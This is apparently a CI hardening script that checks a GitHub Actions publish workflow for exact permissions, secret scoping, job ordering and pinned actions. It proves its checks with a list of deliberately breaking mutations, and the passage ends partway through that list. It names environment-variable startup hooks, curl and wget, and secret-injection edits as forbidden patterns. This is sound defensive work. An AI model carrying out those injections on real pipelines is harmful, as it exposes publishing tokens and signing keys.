#!/usr/bin/env node
// The security contract of .github/workflows/publish.yml, asserted on the PARSED workflow (not on
// text patterns) and proven by mutation: MUTATIONS lists edits that each break one property, and
// `proveMutations` fails if any edit still passes. plan runs this before it plans anything:
//   node scripts/ci/workflow-contract.mjs .github/workflows/publish.yml
import fs from "node:fs";
import { fileURLToPath } from "node:url";
import { parseYaml } from "./workflow-yaml.mjs";

export const VERIFY_HOSTS = ["windows-2025", "xcode-27"];
const ALLOWED_UPLOAD_ACTIONS = ["actions/checkout@", "actions/setup-node@", "actions/download-artifact@"];
const ALLOWED_UPLOAD_RUN = ["node scripts/ci/upload.mjs run"];
// Conditions are compared as exact strings (after trimming), never matched by pattern: an appended
// `|| true`, a reordered operand or a different operator is a different condition.
export const UPLOAD_IF = "${{ needs.plan.outputs.count != '0' && needs.plan.outputs.dry_run == 'false' && github.ref == 'refs/heads/main' }}";
export const NPM_STEP_IF = "${{ needs.plan.outputs.registry == 'npm' }}";
export const CRATES_STEP_IF = "${{ needs.plan.outputs.registry == 'crates' }}";
export const TOKEN_ENV = { NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}", CARGO_REGISTRY_TOKEN: "${{ secrets.CARGO_REGISTRY_TOKEN }}" };
const RT = "${{ runner.temp }}";
const PLAN_OUT = (name) => `\${{ needs.plan.outputs.${name} }}`;
export const PUBLISH_ENV = {
  PUBLISH_REGISTRY: PLAN_OUT("registry"), PUBLISH_UNITS: PLAN_OUT("units"), PUBLISH_ALLOW_HOST_EXCLUSION: PLAN_OUT("allow_host_exclusion"),
  PUBLISH_ALLOW_NO_TEST: PLAN_OUT("allow_no_test"), PUBLISH_ALLOW_IGNORED: PLAN_OUT("allow_ignored"), PUBLISH_ALLOW_MISSING_ASSETS: PLAN_OUT("allow_missing_assets"),
};
// The privileged job, completely: these are the only job keys, step keys, steps, `with` keys and env keys it may carry.
// Anything not listed (NODE_OPTIONS, NPM_CONFIG_*, any *_OPTIONS, PATH, a custom shell, a working directory, a container,
// service containers, defaults, a step the list does not name) is a violation, because the upload job holds the tokens.
export const UPLOAD_JOB_KEYS = ["environment", "if", "needs", "permissions", "runs-on", "steps", "timeout-minutes"];
export const UPLOAD_STEP_KEYS = ["env", "if", "name", "run", "uses", "with"];
export const UPLOAD_STEPS = [
  { uses: "actions/checkout@", with: { "persist-credentials": "false", "sparse-checkout": "scripts/ci/upload.mjs", "sparse-checkout-cone-mode": "false" }, env: [] },
  { uses: "actions/setup-node@", with: { "node-version": /^\d+\.\d+\.\d+$/, "package-manager-cache": "false" }, env: [] },
  { uses: "actions/download-artifact@", with: { name: "publish-packed", path: `${RT}/sealed/packed` }, env: [] },
  { uses: "actions/download-artifact@", with: { pattern: "publish-receipt-verify-*", path: `${RT}/sealed/receipts` }, env: [] },
  { uses: "actions/download-artifact@", with: { pattern: "publication-receipt", path: `${RT}/sealed/previous` }, env: [] },
  { run: "node scripts/ci/upload.mjs run", with: {}, env: { ...PUBLISH_ENV, NODE_AUTH_TOKEN: TOKEN_ENV.NODE_AUTH_TOKEN } },
  { run: "node scripts/ci/upload.mjs run", with: {}, env: { ...PUBLISH_ENV, CARGO_REGISTRY_TOKEN: TOKEN_ENV.CARGO_REGISTRY_TOKEN } },
  { uses: "actions/upload-artifact@", with: { name: "publication-receipt", path: `${RT}/publication-receipt`, "retention-days": "90", overwrite: "true", "if-no-files-found": "ignore" }, env: [] },
];
const HAZARD_ENV = /^(?:NODE_OPTIONS|NODE_PATH|PATH|LD_[A-Z_]+|DYLD_[A-Z_]+|BASH_ENV|ENV|SHELLOPTS|PS4|GITHUB_(?:ENV|PATH)|NPM_CONFIG_.*|.*_OPTIONS)$/i;
const SEAL_CHECK_RUN = "node scripts/ci/upload.mjs run --dry-run";
const SEAL_CHECK_ACTIONS = ["actions/checkout@", "actions/setup-node@", "actions/download-artifact@", "actions/upload-artifact@"];
const ALL_JOBS = ["guard", "plan", "sign-swap", "pack", "verify", "seal-check", "upload"];
// sign-swap signs one binary (rightkit-swap) for @rightkit/release. It is the only job besides upload that may use an
// environment or the secrets context, and then only the three Apple identity secrets, in exactly one step; the build
// that produces the binary runs before that step and holds no secret. pack stays secretless and only downloads the result.
export const SIGN_SWAP_IF = "${{ needs.plan.outputs.count != '0' && needs.plan.outputs.registry == 'npm' && contains(needs.plan.outputs.units, '@rightkit/release') }}";
export const SIGN_SWAP_SECRETS = {
  APPLE_CERTIFICATE_BASE64: "${{ secrets.APPLE_CERTIFICATE_BASE64 }}",
  APPLE_CERTIFICATE_PASSWORD: "${{ secrets.APPLE_CERTIFICATE_PASSWORD }}",
  APPLE_KEYCHAIN_PASSWORD: "${{ secrets.APPLE_KEYCHAIN_PASSWORD }}",
};
export const SIGN_SWAP_ARTIFACT = "rightkit-swap-signed";
export const PACK_IF = "${{ always() && needs.guard.result == 'success' && needs.plan.result == 'success' && needs.plan.outputs.count != '0' && (needs.sign-swap.result == 'success' || needs.sign-swap.result == 'skipped') }}";
const PACK_SWAP_STEP_IF = "${{ needs.sign-swap.result == 'success' }}";
// The licence gate (rightkit#264) lives in plan, which every later job needs, so nothing can pack or upload past a failure.
export const DENY_IF = "${{ inputs.registry == 'crates' && contains(steps.plan.outputs.units, 'rightkit-typeset') }}";
export const DENY_TOOL = "cargo-deny@0.20.2";
export const DENY_RUN = "cargo deny --manifest-path crates/rightkit-typeset/Cargo.toml check --config deny.toml licenses";
const PLAN_ALLOWED_ACTIONS = ["actions/checkout@", "actions/setup-node@", "dtolnay/rust-toolchain@", "taiki-e/install-action@"];
const SIGNING_TOOLS = /\b(?:codesign|notarytool|security\s+(?:import|create-keychain|unlock-keychain|set-key-partition-list)|cargo\b)/;

const same = (a, b) => JSON.stringify(a) === JSON.stringify(b);
const sorted = (list) => [...list].sort();
const stepsOf = (job) => (Array.isArray(job?.steps) ? job.steps : []);
const needsOf = (job) => (Array.isArray(job?.needs) ? job.needs : job?.needs ? [job.needs] : []);

function findKey(value, key, trail = "") {
  const hits = [];
  if (Array.isArray(value)) value.forEach((v, i) => hits.push(...findKey(v, key, `${trail}[${i}]`)));
  else if (value && typeof value === "object") {
    for (const [k, v] of Object.entries(value)) { if (k === key) hits.push(`${trail}.${k}`); hits.push(...findKey(v, key, `${trail}.${k}`)); }
  }
  return hits;
}

/**
 * Every place a string value or a KEY in `value` matches `pattern`. Context names are case-insensitive
 * and cannot be built dynamically, so one word-match on `secrets` finds every expression form:
 * secrets.NAME, secrets['NAME'], secrets["NAME"], toJSON(secrets), a bare `secrets`, ${{ secrets }} at
 * workflow, job or step level, and the `secrets: inherit` key.
 */
export function findMatches(value, pattern, trail = "") {
  const hits = [];
  if (typeof value === "string") { if (pattern.test(value)) hits.push({ path: trail, text: value }); }
  else if (Array.isArray(value)) value.forEach((v, i) => hits.push(...findMatches(v, pattern, `${trail}[${i}]`)));
  else if (value && typeof value === "object") {
    for (const [k, v] of Object.entries(value)) {
      if (pattern.test(k)) hits.push({ path: `${trail}.${k}`, text: k });
      hits.push(...findMatches(v, pattern, `${trail}.${k}`));
    }
  }
  return hits;
}
export const SECRET_PATTERN = /\bsecrets\b/i;
export const ID_TOKEN_PATTERN = /id-token/i;

/** Throws one Error listing every violated property. `doc` is parseYaml output. */
export function assertPublishDoc(doc, name = "publish.yml") {
  const problems = [];
  const check = (ok, message) => { if (!ok) problems.push(message); };
  const jobs = doc?.jobs ?? {};

  // Triggers and ambient authority.
  check(doc?.on && typeof doc.on === "object" && same(Object.keys(doc.on), ["workflow_dispatch"]), "must be triggered by workflow_dispatch only");
  check(same(doc?.permissions, { contents: "read" }), "top-level permissions must be exactly contents: read");
  check(doc?.concurrency?.["cancel-in-progress"] === "false", "a publish must never be cancelled half-way");
  check(same(sorted(Object.keys(jobs)), sorted(ALL_JOBS)), `jobs must be exactly ${ALL_JOBS.join(", ")}`);
  const { guard, plan, pack, verify, upload } = jobs;
  const signSwap = jobs["sign-swap"];
  const sealCheck = jobs["seal-check"];
  const rest = { ...doc }; delete rest.jobs;
  check(findMatches(rest, SECRET_PATTERN).length === 0 && findMatches(rest, ID_TOKEN_PATTERN).length === 0, `no secret or id-token outside a job (${[...findMatches(rest, SECRET_PATTERN), ...findMatches(rest, ID_TOKEN_PATTERN)].map((h) => h.path).join(", ")})`);
  check(doc?.env === undefined && doc?.defaults === undefined, "no workflow-level env or defaults");
  check(findKey(doc, "continue-on-error").length === 0, `continue-on-error is forbidden (${findKey(doc, "continue-on-error").join(", ")})`);
  check(findKey(doc, "pull_request_target").length === 0, "pull_request_target is forbidden");

  // The main-only, public-only guard, and every job behind it.
  const guardStep = stepsOf(guard)[0];
  check(guard && stepsOf(guard).length === 1 && guard.if === undefined && guardStep?.if === undefined, "guard must be one unconditional step");
  check(guardStep?.env?.REF === "${{ github.ref }}" && guardStep?.env?.PRIVATE === "${{ github.event.repository.private }}", "guard must read the ref and repository visibility from the event");
  check(/if \[ "\$REF" != "refs\/heads\/main" \]; then\s+echo [^\n]*\s+exit 1\s+fi/.test(guardStep?.run ?? ""), "guard must exit 1 unless the ref is refs/heads/main");
  check(/if \[ "\$PRIVATE" != "false" \]; then\s+echo [^\n]*\s+exit 1\s+fi/.test(guardStep?.run ?? ""), "guard must exit 1 unless the repository is public");
  const reaches = (job, target, seen = new Set()) => needsOf(jobs[job]).some((n) => n === target || (!seen.has(n) && seen.add(n) && reaches(n, target, seen)));
  for (const job of ALL_JOBS.filter((j) => j !== "guard")) check(reaches(job, "guard"), `${job} must run only after guard`);
  for (const [jobName, job] of Object.entries(jobs)) {
    check((job["timeout-minutes"] ?? "") !== "", `${jobName} must set timeout-minutes`);
  }

  // Both verify hosts exist and gate the upload.
  check(same(sorted(verify?.strategy?.matrix?.os ?? []), VERIFY_HOSTS), `verify must run on exactly ${VERIFY_HOSTS.join(" and ")}`);
  check(verify?.strategy?.matrix && !("exclude" in verify.strategy.matrix) && !("include" in verify.strategy.matrix), "verify matrix must not exclude or include legs");
  check(verify?.["runs-on"] === "${{ matrix.os }}", "verify must run on the matrix host");
  for (const needed of ["guard", "plan", "sign-swap"]) check(needsOf(pack).includes(needed), `pack must need ${needed}`);
  for (const needed of ["guard", "plan", "pack"]) check(needsOf(verify).includes(needed), `verify must need ${needed}`);
  for (const needed of ["verify", "pack", "plan"]) check(needsOf(sealCheck).includes(needed), `seal-check must need ${needed}`);
  for (const needed of ["guard", "plan", "pack", "verify", "seal-check"]) check(needsOf(upload).includes(needed), `upload must need ${needed}`);
  for (const [jobName, job] of [["verify", verify], ["seal-check", sealCheck]]) {
    check(job?.if === "${{ needs.plan.outputs.count != '0' }}", `${jobName} may be skipped only when the plan is empty`);
  }
  // pack runs after sign-swap succeeded or was skipped (a crates run, or a run without @rightkit/release), never after it failed.
  check(typeof pack?.if === "string" && pack.if.trim() === PACK_IF, `pack's condition must be exactly ${PACK_IF}`);
  const verifyRuns = stepsOf(verify).map((s) => s.run ?? "");
  const gateAt = verifyRuns.findIndex((r) => /node scripts\/ci\/gate\.mjs --registry /.test(r) && /--allow-host-exclusion/.test(r) && /--allow-no-test/.test(r));
  const receiptAt = verifyRuns.findIndex((r) => /node scripts\/ci\/publish\.mjs verify/.test(r));
  check(gateAt >= 0 && receiptAt > gateAt, "verify must run the unit gate, then publish.mjs verify, on every host");
  const chromeStep = stepsOf(verify).find((s) => /provision-chrome\.mjs/.test(s.run ?? ""));
  check(chromeStep?.run?.trim() === "node scripts/ci/provision-chrome.mjs" && chromeStep?.env?.PUBLISH_DRY_RUN === "${{ needs.plan.outputs.dry_run }}", "the Chrome pin step must run the provision script with PUBLISH_DRY_RUN taken from the plan's dry_run output (an unpinned download may be recorded only in a dry run)");
  check(stepsOf(verify).some((s) => /actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === "publish-packed"), "verify must download the sealed publish-packed artifact");
  check(stepsOf(pack).some((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? "")) && stepsOf(pack).some((s) => /actions\/upload-artifact@/.test(s.uses ?? "") && s.with?.name === "publish-packed"), "pack must seal and upload publish-packed");
  check(stepsOf(plan).some((s) => /node scripts\/ci\/workflow-contract\.mjs/.test(s.run ?? "")), "plan must run this contract before planning");

  // Secrets and id-token exist only in upload, and nothing else is privileged.
  for (const [jobName, job] of Object.entries(jobs)) {
    if (jobName === "upload") continue;
    const isSign = jobName === "sign-swap";
    const secretHits = findMatches(job, SECRET_PATTERN); const idHits = findMatches(job, ID_TOKEN_PATTERN);
    if (!isSign) check(secretHits.length === 0, `${jobName} must not reference the secrets context in any form (${secretHits.map((h) => h.path).join(", ")})`);
    check(idHits.length === 0, `${jobName} must not request id-token (${idHits.map((h) => h.path).join(", ")})`);
    if (!isSign) check(job.environment === undefined, `${jobName} must not use an environment`);
    check(job.env === undefined && job.uses === undefined && job.secrets === undefined, `${jobName} has no job-level env, uses or secrets`);
    check(job.permissions === undefined || same(job.permissions, { contents: "read" }), `${jobName} permissions must be contents: read`);
  }
  check(upload?.environment === "release", "upload must use environment: release");
  check(same(upload?.permissions, { contents: "read", "id-token": "write" }), "upload permissions must be exactly contents: read and id-token: write");
  check(typeof upload?.if === "string" && upload.if.trim() === UPLOAD_IF, `upload's condition must be exactly ${UPLOAD_IF}`);
  check(upload?.["runs-on"] === "ubuntu-24.04", "upload runs on a fresh hosted runner");
  const uploadSteps = stepsOf(upload);
  const secretRefs = findMatches(upload, SECRET_PATTERN);
  const tokenSteps = [];
  uploadSteps.forEach((step, i) => {
    if (step.uses) check(ALLOWED_UPLOAD_ACTIONS.some((a) => step.uses.startsWith(a)) || /^actions\/upload-artifact@/.test(step.uses), `upload may not use ${step.uses}`);
    if (step.run !== undefined) check(ALLOWED_UPLOAD_RUN.includes(step.run.trim()), `upload may run only ${ALLOWED_UPLOAD_RUN.join(", ")}, not ${JSON.stringify(step.run.trim().slice(0, 60))}`);
    const own = secretRefs.filter((h) => h.path.startsWith(`.steps[${i}]`));
    if (own.length) tokenSteps.push({ step, i, own });
    // Step conditions are exact: only the two token steps (own registry) and the always-run receipt upload may have one.
    if (step.env?.NODE_AUTH_TOKEN !== undefined || step.env?.CARGO_REGISTRY_TOKEN !== undefined || own.length) return;
    if (/^actions\/upload-artifact@/.test(step.uses ?? "")) check(step.if === undefined || step.if.trim() === "always()", `upload step ${i} may carry no condition other than always()`);
    else check(step.if === undefined, `upload step ${i} (${step.name ?? step.uses ?? "run"}) may carry no condition`);
  });
  check(secretRefs.every((h) => /^\.steps\[\d+\]\.env\.(NODE_AUTH_TOKEN|CARGO_REGISTRY_TOKEN)$/.test(h.path)), `the secrets context may appear only as the value of NODE_AUTH_TOKEN or CARGO_REGISTRY_TOKEN in a step env (found ${secretRefs.map((h) => h.path).join(", ")})`);
  check(upload?.env === undefined && upload?.defaults === undefined && upload?.uses === undefined && upload?.secrets === undefined, "upload has no job-level env, defaults, uses or secrets");
  // The privileged job is closed: exact job keys, exact steps, exact step keys, exact `with` keys and env keys per step.
  const extraJobKeys = Object.keys(upload ?? {}).filter((k) => !UPLOAD_JOB_KEYS.includes(k));
  check(extraJobKeys.length === 0, `upload may carry only the keys ${UPLOAD_JOB_KEYS.join(", ")}, not ${extraJobKeys.join(", ")} (container, services, defaults, env, strategy, outputs and concurrency are forbidden there)`);
  check(uploadSteps.length === UPLOAD_STEPS.length, `upload must have exactly ${UPLOAD_STEPS.length} steps (${UPLOAD_STEPS.map((x) => x.uses ?? "run").join(", ")}); found ${uploadSteps.length}`);
  UPLOAD_STEPS.forEach((expected, i) => {
    const step = uploadSteps[i];
    if (!step) return;
    const where = `upload step ${i} (${step.name ?? step.uses ?? "run"})`;
    const stray = Object.keys(step).filter((k) => !UPLOAD_STEP_KEYS.includes(k));
    check(stray.length === 0, `${where} may carry only the keys ${UPLOAD_STEP_KEYS.join(", ")}, not ${stray.join(", ")} (no shell, working-directory, id, timeout or continue-on-error)`);
    if (expected.uses) check(typeof step.uses === "string" && step.uses.startsWith(expected.uses) && step.run === undefined, `${where} must be ${expected.uses}`);
    else check(step.run !== undefined && step.uses === undefined && step.run.trim() === expected.run, `${where} must run exactly ${expected.run}`);
    const withKeys = Object.keys(step.with ?? {});
    check(same(sorted(withKeys), sorted(Object.keys(expected.with))), `${where} must carry exactly the with keys [${Object.keys(expected.with).join(", ")}], not [${withKeys.join(", ")}]`);
    for (const [key, want] of Object.entries(expected.with)) {
      const have = step.with?.[key];
      check(have !== undefined && (want instanceof RegExp ? want.test(String(have)) : String(have) === want), `${where}: with.${key} must be ${want instanceof RegExp ? String(want) : JSON.stringify(want)}`);
    }
    const envKeys = Object.keys(step.env ?? {});
    const wantEnv = Array.isArray(expected.env) ? {} : expected.env;
    for (const key of envKeys) if (HAZARD_ENV.test(key)) check(false, `${where}: env ${key} is a startup-hook, search-path, option or npm-config override and is never allowed`);
    check(same(sorted(envKeys), sorted(Object.keys(wantEnv))), `${where} must carry exactly the env keys [${Object.keys(wantEnv).join(", ")}], not [${envKeys.join(", ")}]`);
    for (const [key, want] of Object.entries(wantEnv)) check(step.env?.[key] === undefined || String(step.env[key]).trim() === want, `${where}: env ${key} must be ${want}`);
  });
  const checkout = uploadSteps.find((s) => /^actions\/checkout@/.test(s.uses ?? ""));
  check(checkout?.with?.["sparse-checkout"] === "scripts/ci/upload.mjs" && checkout?.with?.["sparse-checkout-cone-mode"] === "false", "upload must check out scripts/ci/upload.mjs and nothing else");
  const tokenEnv = (vars) => tokenSteps.filter(({ step }) => Object.keys(step.env ?? {}).some((k) => vars.includes(k)));
  check(tokenSteps.length === 2, "upload must have exactly two steps that read a secret (one per registry)");
  const npmStep = tokenEnv(["NODE_AUTH_TOKEN"])[0]?.step; const cratesStep = tokenEnv(["CARGO_REGISTRY_TOKEN"])[0]?.step;
  check(npmStep && npmStep.env.NODE_AUTH_TOKEN === TOKEN_ENV.NODE_AUTH_TOKEN && !("CARGO_REGISTRY_TOKEN" in npmStep.env), "the npm step must read exactly NODE_AUTH_TOKEN from secrets.NPM_TOKEN");
  check(cratesStep && cratesStep.env.CARGO_REGISTRY_TOKEN === TOKEN_ENV.CARGO_REGISTRY_TOKEN && !("NODE_AUTH_TOKEN" in cratesStep.env), "the crates step must read exactly CARGO_REGISTRY_TOKEN from secrets.CARGO_REGISTRY_TOKEN");
  check(tokenSteps.every(({ own }) => own.length === 1), "each upload step may read exactly one token");
  check(npmStep?.if?.trim() === NPM_STEP_IF && cratesStep?.if?.trim() === CRATES_STEP_IF, "each token step must run only for its own registry (exact condition)");
  check(tokenSteps.every(({ step }) => step.run?.trim() === "node scripts/ci/upload.mjs run"), "a token step may only run the upload script");

  // Licence gate: pinned install, then the exact check, both only for a crates run naming rightkit-typeset, both after the plan step,
  // in a job with no secret; plan is needed (directly or not) by pack, verify, seal-check and upload.
  const planSteps = stepsOf(plan);
  for (const step of planSteps) if (step.uses) check(PLAN_ALLOWED_ACTIONS.some((a) => step.uses.startsWith(a)), `plan may use only ${PLAN_ALLOWED_ACTIONS.join(", ")}, not ${step.uses}`);
  const denyInstallAt = planSteps.findIndex((s) => (s.uses ?? "").startsWith("taiki-e/install-action@"));
  const denyRunAt = planSteps.findIndex((s) => /cargo deny\b/.test(s.run ?? ""));
  const planAt = planSteps.findIndex((s) => s.run?.trim() === "node scripts/ci/publish.mjs plan");
  check(denyInstallAt >= 0 && planSteps.filter((s) => (s.uses ?? "").startsWith("taiki-e/install-action@")).length === 1 && planSteps[denyInstallAt].if?.trim() === DENY_IF && same(Object.keys(planSteps[denyInstallAt].with ?? {}), ["tool"]) && planSteps[denyInstallAt].with.tool === DENY_TOOL && planSteps[denyInstallAt].env === undefined, `plan must install ${DENY_TOOL} (pinned action, only the tool input) under the exact licence-gate condition`);
  check(denyRunAt >= 0 && planSteps.filter((s) => /cargo deny\b/.test(s.run ?? "")).length === 1 && planSteps[denyRunAt].run.trim() === DENY_RUN && planSteps[denyRunAt].if?.trim() === DENY_IF && planSteps[denyRunAt].env === undefined && planSteps[denyRunAt].shell === undefined, `plan must run exactly "${DENY_RUN}" under the exact licence-gate condition, with no env or shell`);
  check(planAt >= 0 && denyInstallAt > planAt && denyRunAt > denyInstallAt, "the licence gate must install the checker, then run it, after the plan step");
  for (const job of ["pack", "verify", "seal-check", "upload"]) check(reaches(job, "plan"), `${job} must run only after plan, which holds the licence gate`);

  // sign-swap: the one other job that holds a secret. Exactly one step reads exactly the three Apple identity secrets,
  // after the build; nothing else is privileged; the signed bytes leave only as the rightkit-swap-signed artifact.
  const signSteps = stepsOf(signSwap);
  check(signSwap?.environment === "release", "sign-swap must use environment: release");
  check(same(signSwap?.permissions, { contents: "read" }), "sign-swap permissions must be exactly contents: read (no id-token)");
  check(typeof signSwap?.if === "string" && signSwap.if.trim() === SIGN_SWAP_IF, `sign-swap's condition must be exactly ${SIGN_SWAP_IF}`);
  check(signSwap?.["runs-on"] === "xcode-27", "sign-swap runs on the macOS signing host xcode-27");
  check(needsOf(signSwap).includes("guard") && needsOf(signSwap).includes("plan"), "sign-swap must need guard and plan");
  const signSecretRefs = findMatches(signSwap, SECRET_PATTERN);
  const secretStepIndexes = [...new Set(signSecretRefs.map((h) => Number(/^\.steps\[(\d+)\]/.exec(h.path)?.[1] ?? -1)))];
  check(signSecretRefs.every((h) => /^\.steps\[\d+\]\.env\.[A-Z0-9_]+$/.test(h.path)), `sign-swap may read the secrets context only as step env values (found ${signSecretRefs.map((h) => h.path).join(", ")})`);
  check(secretStepIndexes.length === 1 && secretStepIndexes[0] >= 0, "sign-swap must read secrets in exactly one step");
  const keychainStep = signSteps[secretStepIndexes[0]];
  check(keychainStep && same(sorted(Object.keys(keychainStep.env ?? {})), sorted(Object.keys(SIGN_SWAP_SECRETS))) && Object.entries(SIGN_SWAP_SECRETS).every(([k, v]) => String(keychainStep.env[k]).trim() === v), "the sign-swap secret step must read exactly APPLE_CERTIFICATE_BASE64, APPLE_CERTIFICATE_PASSWORD and APPLE_KEYCHAIN_PASSWORD from the same-named secrets");
  check(keychainStep?.uses === undefined && keychainStep?.if === undefined && !/cargo|curl|wget|node|pnpm|npm|\bsh\b/.test(keychainStep?.run ?? ""), "the sign-swap secret step may only run keychain commands, with no condition");
  const buildAt = signSteps.findIndex((s) => /cargo build /.test(s.run ?? ""));
  check(buildAt >= 0 && buildAt < secretStepIndexes[0] && signSteps[buildAt].env === undefined && /-p rightkit-fs --bin rightkit-swap/.test(signSteps[buildAt].run), "sign-swap must build rightkit-fs's rightkit-swap before any secret is read, in a step with no env");
  check(signSteps.every((s, i) => i === secretStepIndexes[0] || !/\bsecurity\s+(?:import|create-keychain)\b/.test(s.run ?? "")), "only the secret step may import the signing identity");
  const codesignStep = signSteps.find((s) => /codesign --force/.test(s.run ?? ""));
  check(codesignStep && same(Object.keys(codesignStep.env ?? {}), ["APPLE_DEVELOPER_ID"]) && codesignStep.env.APPLE_DEVELOPER_ID === "${{ vars.APPLE_DEVELOPER_ID }}" && /--options runtime/.test(codesignStep.run) && /--timestamp/.test(codesignStep.run) && /codesign --verify --strict/.test(codesignStep.run) && /shasum -a 256/.test(codesignStep.run), "sign-swap must sign with --options runtime --timestamp as vars.APPLE_DEVELOPER_ID, verify with --strict and record the sha256");
  check(signSteps.some((s) => /security delete-keychain/.test(s.run ?? "") && s.if?.trim() === "${{ always() }}"), "sign-swap must remove the keychain in an always() step");
  const handOver = signSteps.filter((s) => /^actions\/upload-artifact@/.test(s.uses ?? ""));
  check(handOver.length === 1 && handOver[0].with?.name === SIGN_SWAP_ARTIFACT && handOver[0].with?.path === `${RT}/swap-signed`, `sign-swap must hand over exactly ${RT}/swap-signed as the ${SIGN_SWAP_ARTIFACT} artifact`);
  check(signSteps.every((s) => !s.uses || /^(?:actions\/(?:checkout|upload-artifact)|dtolnay\/rust-toolchain)@/.test(s.uses)), "sign-swap may use only checkout, the Rust toolchain and upload-artifact");
  // pack is secretless and consumes the signed helper only by download.
  const packSwapDownload = stepsOf(pack).filter((s) => /^actions\/download-artifact@/.test(s.uses ?? "") && s.with?.name === SIGN_SWAP_ARTIFACT);
  check(packSwapDownload.length === 1 && packSwapDownload[0].if?.trim() === PACK_SWAP_STEP_IF && same(sorted(Object.keys(packSwapDownload[0].with)), ["name", "path"]) && packSwapDownload[0].with.path === `${RT}/swap-signed`, `pack must download ${SIGN_SWAP_ARTIFACT} into ${RT}/swap-signed with only name and path, only when sign-swap succeeded`);
  const packSigningRuns = stepsOf(pack).filter((s) => SIGNING_TOOLS.test(s.run ?? ""));
  check(packSigningRuns.length === 0, `pack must not sign or build the helper itself (${packSigningRuns.map((s) => s.name ?? s.run).join(", ")})`);
  const placeAt = stepsOf(pack).findIndex((s) => /install -m 0755 [^\n]*packages\/release\/bin\/darwin\/rightkit-swap/.test(s.run ?? "") && /sha256sum -c/.test(s.run ?? ""));
  const packAt = stepsOf(pack).findIndex((s) => /node scripts\/ci\/publish\.mjs pack/.test(s.run ?? ""));
  check(placeAt >= 0 && stepsOf(pack)[placeAt].if?.trim() === PACK_SWAP_STEP_IF && placeAt < packAt, "pack must re-check the helper's sha256, place it at packages/release/bin/darwin/rightkit-swap and do so before it packs");

  // The dry run: same script, no secret, no id-token, nothing sent.
  const dryStep = stepsOf(sealCheck).find((s) => s.run?.trim() === SEAL_CHECK_RUN);
  check(dryStep && dryStep.if === undefined, "seal-check must run the upload script with --dry-run, unconditionally");
  check(stepsOf(sealCheck).every((s) => s.run === undefined || s.run.trim() === SEAL_CHECK_RUN), `seal-check may run only ${SEAL_CHECK_RUN}`);
  check(stepsOf(sealCheck).every((s) => s.run !== undefined || SEAL_CHECK_ACTIONS.some((a) => (s.uses ?? "").startsWith(a))), "seal-check may use only checkout, setup-node and the artifact actions");
  check(plan?.outputs?.dry_run === "${{ steps.plan.outputs.dry_run }}", "plan's dry_run output must be the plan step's");
  const sealCheckout = stepsOf(sealCheck).find((s) => /^actions\/checkout@/.test(s.uses ?? ""));
  check(sealCheckout?.with?.["sparse-checkout"] === "scripts/ci/upload.mjs", "seal-check must check out only the upload script");

  // Hygiene on every job.
  for (const [jobName, job] of Object.entries(jobs)) {
    for (const step of stepsOf(job)) {
      if (step.uses) {
        check(/@[0-9a-f]{40}(?:\s|$)/.test(step.uses) || /@[0-9a-f]{40}$/.test(step.uses), `${jobName}: ${step.uses} must be pinned to a 40-hex commit`);
        if (/^actions\/checkout@/.test(step.uses)) check(step.with?.["persist-credentials"] === "false", `${jobName}: checkout must set persist-credentials: false`);
      }
      if (step.run !== undefined) check(!/\$\{\{/.test(step.run), `${jobName}: run text must not interpolate expressions; pass values through env`);
    }
  }
  if (problems.length) throw new Error(`${name} violates the publish contract:\n  - ${problems.join("\n  - ")}`);
  return true;
}

export function assertPublishWorkflow(text, name = "publish.yml") { return assertPublishDoc(parseYaml(text), name); }

const edit = (fn) => (doc) => { fn(doc.jobs, doc); };
const actionStep = (uses) => ({ name: "injected", uses });

/** Each mutation breaks exactly one property; the contract must reject every one. */
export const MUTATIONS = [
  ["drop the Windows verify host", edit((j) => { j.verify.strategy.matrix.os = ["xcode-27"]; })],
  ["drop the macOS verify host", edit((j) => { j.verify.strategy.matrix.os = ["windows-2025"]; })],
  ["exclude a verify leg", edit((j) => { j.verify.strategy.matrix.exclude = [{ os: "windows-2025" }]; })],
  ["upload no longer needs verify", edit((j) => { j.upload.needs = j.upload.needs.filter((n) => n !== "verify"); })],
  ["upload no longer needs seal-check", edit((j) => { j.upload.needs = j.upload.needs.filter((n) => n !== "seal-check"); })],
  ["seal-check no longer needs verify", edit((j) => { j["seal-check"].needs = j["seal-check"].needs.filter((n) => n !== "verify"); })],
  ["continue-on-error on a job", edit((j) => { j.verify["continue-on-error"] = "true"; })],
  ["continue-on-error on a step", edit((j) => { j.verify.steps[0]["continue-on-error"] = "true"; })],
  ["guard allows another branch", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replace('"$REF" != "refs/heads/main"', '"$REF" != "refs/heads/dev"'); })],
  ["guard accepts a private repository", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replace('"$PRIVATE" != "false"', '"$PRIVATE" != "maybe"'); })],
  ["guard no longer exits", edit((j) => { j.guard.steps[0].run = j.guard.steps[0].run.replaceAll("exit 1", "true"); })],
  ["plan escapes the guard", edit((j) => { j.plan.needs = []; })],
  ["verify requests id-token", edit((j) => { j.verify.permissions = { contents: "read", "id-token": "write" }; })],
  ["pack reads a secret", edit((j) => { j.pack.steps.at(-2).env = { ...(j.pack.steps.at(-2).env ?? {}), NODE_AUTH_TOKEN: "${{ secrets.NPM_TOKEN }}" }; })],
  ["verify reads a secret", edit((j) => { j.verify.steps.at(-3).env = { ...(j.verify.steps.at(-3).env ?? {}), CARGO_REGISTRY_TOKEN: "${{ secrets.CARGO_REGISTRY_TOKEN }}" }; })],
  ["seal-check reads a secret", edit((j) => { j["seal-check"].steps.find((s) => s.run).env.NODE_AUTH_TOKEN = "${{ secrets.NPM_TOKEN }}"; })],
  ["seal-check joins the release environment", edit((j) => { j["seal-check"].environment = "release"; })],
  ["seal-check requests id-token", edit((j) => { j["seal-check"].permissions = { contents: "read", "id-token": "write" }; })],
  ["upload installs dependencies", edit((j) => { j.upload.steps.splice(2, 0, { name: "install", run: "pnpm install --frozen-lockfile" }); })],
  ["upload builds", edit((j) => { j.upload.steps.splice(2, 0, { name: "build", run: "cargo build --release" }); })],
  ["upload adds pnpm", edit((j) => { j.upload.steps.splice(2, 0, actionStep("pnpm/action-setup@0977fd99725f1db4007ccb2928dbb4e90d06cc86")); })],
  ["upload adds a Rust toolchain", edit((j) => { j.upload.steps.splice(2, 0, actionStep("dtolnay/rust-toolchain@f8be11a05b1d4f3fcebe6410cc16743212b999b0")); })],
